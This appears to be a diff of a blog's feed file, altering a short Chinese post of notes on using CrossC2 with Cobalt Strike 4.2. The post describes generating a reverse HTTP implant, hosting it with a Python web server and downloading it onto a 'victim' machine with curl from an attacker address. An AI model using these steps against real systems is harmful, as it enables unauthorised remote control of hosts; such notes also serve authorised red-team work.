@@ -21,7 +21,7 @@
       <link href="/posts/89b968f1.html"/>
       <url>/posts/89b968f1.html</url>
       
-        <content type="html"><![CDATA[<p>CrossC2使用相关的笔记</p><a id="more"></a><p>关于CrossC2的使用要了解以下几点</p><ul><li>genCrossC2的genCrossC2.Win.exe和genCrossC2.Linux是指genCrossC2程序在对应操作系统下的可执行文件。</li><li>由genCrossC2生成的C2对应的具体操作系统平台，是在执行genCrossC2的时候指定的。</li><li>CrossC2.cna是放在客户端的，用来给CS添加CrossC2菜单。CrossC2.cna里面的$CC2_PATH.$CC2_BIN是genCross在teamServer操作系统下的路径，是实际生成C2的文件。</li></ul><p>一般用法（CS4.2+CrossC2）</p><p>在CS菜单中的CrossC2-&gt;Create CrossC2 Listener-&gt;Create Reverse http listener中生成命令，修改下粘贴到teamserver的主机上执行，生成C2 </p><p><code>python -m http.server 80</code> 起web</p><p>victim机下载 <code>curl -O http://xxx.xx.xxx.xx:80/CrossC2-test</code></p>]]></content>
+        <content type="html"><![CDATA[<p>CrossC2使用相关的笔记</p><a id="more"></a><p>关于CrossC2的使用要了解以下几点</p><ul><li>genCrossC2的genCrossC2.Win.exe和genCrossC2.Linux是指genCrossC2程序在对应操作系统下的可执行文件。</li><li>由genCrossC2生成的C2对应的具体操作系统平台，是在执行genCrossC2的时候指定的。</li><li>CrossC2.cna是放在客户端的，用来给CS添加CrossC2菜单。CrossC2.cna里面的$CC2_PATH.$CC2_BIN是genCross在teamServer操作系统下的路径，是实际生成C2的文件。</li></ul><p>一般用法（CS4.2+CrossC2）</p><p>在CS菜单中的CrossC2-&gt;Create CrossC2 Listener-&gt;Create Reverse http listener中生成命令，修改下粘贴到teamserver的主机上执行，生成C2 </p><p><code>python -m http.server 80</code>起web</p><p>victim机下载 <code>curl -O http://xxx.xx.xxx.xx:80/CrossC2-test</code></p>]]></content>
       
       
       <categories>
